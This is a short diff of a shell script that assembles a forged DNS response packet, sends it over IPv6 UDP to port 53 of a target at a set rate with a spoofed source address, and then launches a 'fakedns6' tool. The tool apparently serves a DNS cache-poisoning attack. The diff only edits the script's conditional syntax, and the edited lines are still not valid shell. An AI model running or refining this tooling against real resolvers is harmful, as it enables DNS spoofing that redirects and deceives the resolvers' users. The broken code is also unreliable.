@@ -18,12 +18,11 @@ cat txid.bin dns_start.bin dns_mid.bin dns_end.bin dns_OPT.bin > dns.bin
 # fire!
 echo "fire"
 udp6 -d $1 -a 53 -Z dns.bin -r 50pps -s $2
-a=$RANDOM %10
-echo 8
-if a>8
-do
+a=$RANDOM % 10
+echo $a
+if a -gt 8; then
   ./fakedns6 -a $5 -b $1 -i $3 -n $4 -r $1 -t 50000 -at $2 -tg 0 -s 10000 -e 65000 -j 0 -f 1 >/dev/null 2>&1
   echo 1
-done
+fi
 
 
